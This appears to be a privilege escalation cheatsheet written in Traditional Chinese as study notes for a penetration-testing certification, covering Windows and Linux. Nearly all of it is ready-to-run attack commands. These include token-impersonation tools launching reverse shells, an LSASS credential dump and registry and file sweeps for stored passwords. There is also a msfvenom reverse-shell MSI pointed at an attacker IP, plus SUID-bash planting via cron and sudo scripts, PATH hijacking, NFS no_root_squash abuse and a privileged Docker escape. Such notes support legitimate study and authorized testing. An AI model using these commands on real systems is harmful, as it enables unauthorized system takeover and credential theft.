# Privilege Escalation Cheatsheet

## 標籤

- #cpts
- #cheatsheets
- #privesc

---

## Windows 提權

### 第一步：快速枚舉

```powershell
# 身份確認
whoami
whoami /priv
whoami /groups
net user %username% /domain

# 系統資訊
systeminfo
wmic os get Caption,Version,BuildNumber
wmic qfe get HotFixID,InstalledOn  # 已安裝的 patch

# 本機使用者 & 群組
net users
net localgroup administrators

# 網路
ipconfig /all
netstat -ano
route print
arp -a
```

### SeImpersonatePrivilege（最常見，MSSQL/IIS/Service）

```powershell
# 確認有 SeImpersonatePrivilege
whoami /priv | findstr Impersonate

# PrintSpoofer（Windows Server 2019 / Win10）
.\PrintSpoofer.exe -i -c "cmd /c whoami"
.\PrintSpoofer.exe -i -c "cmd /c powershell -e BASE64_REVERSE_SHELL"

# GodPotato（更通用）
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "cmd /c powershell -e BASE64_PAYLOAD"

# 上傳方式（evil-winrm shell 中）
upload /tmp/PrintSpoofer.exe C:\Windows\Temp\ps.exe
```

### SeTcbPrivilege（模擬任意 token）

```powershell
# 確認
whoami /priv | findstr SeTcbPrivilege

# 用 CreateProcessWithTokenW 模擬 SYSTEM token 執行指令
# 通常需要自訂工具或 PowerShell 腳本
```

### 服務設定錯誤

```cmd
# 找 Unquoted Service Path
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# 找可寫 service binary
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
sc qc VULNERABLE_SERVICE

# 找可寫目錄
icacls "C:\Program Files\Vuln App" /T | findstr "Everyone\|BUILTIN\|Users" | findstr "F\|M\|W"
```

### 登錄檔密碼

```cmd
# AutoLogon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# AlwaysInstallElevated（用 .msi 提權）
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# 密碼儲存
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### 憑證蒐集

```powershell
# LSASS dump（comsvcs.dll，不需 Mimikatz）
$pid = (Get-Process lsass).Id
rundll32 C:\Windows\System32\comsvcs.dll MiniDump $pid C:\Windows\Temp\lsass.dmp full

# Credential Manager
cmdkey /list
# 若有儲存，用 runas /savecred
runas /savecred /user:DOMAIN\Administrator "cmd /c whoami > C:\Windows\Temp\out.txt"

# DPAPI 解密（已知 masterkey）
.\SharpDPAPI.exe credentials /unprotect

# 找設定檔密碼
findstr /si password C:\*.xml C:\*.ini C:\*.config C:\*.txt 2>nul
dir /s /b *pass* *cred* *secret* C:\ 2>nul
```

### AlwaysInstallElevated（MSI 提權）

```bash
# Kali 生成 payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f msi -o evil.msi

# 目標機安裝
msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
```

---

## Linux 提權

### 第一步：快速枚舉

```bash
# 身份確認
id
sudo -l
groups

# 系統資訊
uname -a
cat /etc/os-release
cat /proc/version

# 使用者
cat /etc/passwd | grep -v nologin
ls /home/

# 網路
ip a
ip route
ss -lntp
```

### Sudo 提權

```bash
# 確認 sudo 規則
sudo -l

# 常見 GTFOBins 指令
# https://gtfobins.github.io/

sudo vim -c ':!/bin/bash'
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo find . -exec /bin/bash \; -quit
sudo awk 'BEGIN {system("/bin/bash")}'
sudo less /etc/passwd  # 進去後按 !bash

# NOPASSWD 腳本 → 檢查是否可寫
ls -la /path/to/sudo_script.sh
echo 'chmod +s /bin/bash' >> /path/to/sudo_script.sh
sudo /path/to/sudo_script.sh
/bin/bash -p
```

### SUID / SGID

```bash
# 找 SUID
find / -perm -4000 -type f 2>/dev/null

# 找 SGID
find / -perm -2000 -type f 2>/dev/null

# 常見可利用 SUID
# bash -p  (if bash has SUID)
# find . -exec /bin/sh \; -quit
# python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Cron Job

```bash
# 列出 crontabs
cat /etc/crontab
ls -la /etc/cron*
crontab -l

# 找可寫的 cron script
cat /etc/crontab | grep -v "^#"
# 如果 script 可寫：
echo 'chmod +s /bin/bash' >> /path/to/cron_script.sh
# 等 cron 執行後
/bin/bash -p
```

### 可寫路徑（PATH 劫持）

```bash
# 確認 PATH
echo $PATH

# 若有可寫目錄在 PATH 前面
# 找 sudo -l 執行的相對路徑指令
# 建立同名惡意腳本
echo '/bin/bash' > /tmp/curl
chmod +x /tmp/curl
export PATH=/tmp:$PATH
sudo /vulnerable_script  # 會跑到 /tmp/curl
```

### NFS 錯誤設定

```bash
# Kali 上查 NFS share
showmount -e TARGET_IP

# 掛載
mkdir /tmp/nfs_mount
mount -t nfs TARGET_IP:/share /tmp/nfs_mount -o nolock

# 若 no_root_squash → 放 SUID bash
cp /bin/bash /tmp/nfs_mount/bash
chmod +s /tmp/nfs_mount/bash

# 目標機執行
/share/bash -p
```

### 容器逃逸（Docker）

```bash
# 確認是否在容器裡
cat /.dockerenv
hostname

# 確認是否 privileged
fdisk -l  # 若看到宿主機磁碟，可能是 privileged

# privileged 逃逸
fdisk -l
mkdir /tmp/escape && mount /dev/sda1 /tmp/escape
chroot /tmp/escape /bin/bash
```

---

## 速查：先試哪個

```text
Windows：
1. whoami /priv → SeImpersonatePrivilege → PrintSpoofer / GodPotato
2. 找服務設定錯誤 (unquoted path, weak perms)
3. 找登錄檔明文密碼 (AutoLogon, AlwaysInstallElevated)
4. LSASS dump → offline crack

Linux：
1. sudo -l → GTFOBins
2. find / -perm -4000 → SUID
3. crontab 可寫腳本
4. PATH 劫持
5. NFS no_root_squash
6. kernel exploit (最後手段)
```

## 關聯筆記

- [[../10-Windows-Privilege-Escalation/82-本機列舉|第 82 章 - 本機列舉]]
- [[../10-Windows-Privilege-Escalation/85-權杖與權限濫用|第 85 章 - 權杖與權限濫用]]
- [[../11-Linux-Privilege-Escalation/89-本機列舉|第 89 章 - 本機列舉]]
- [[../11-Linux-Privilege-Escalation/90-Sudo|第 90 章 - Sudo]]
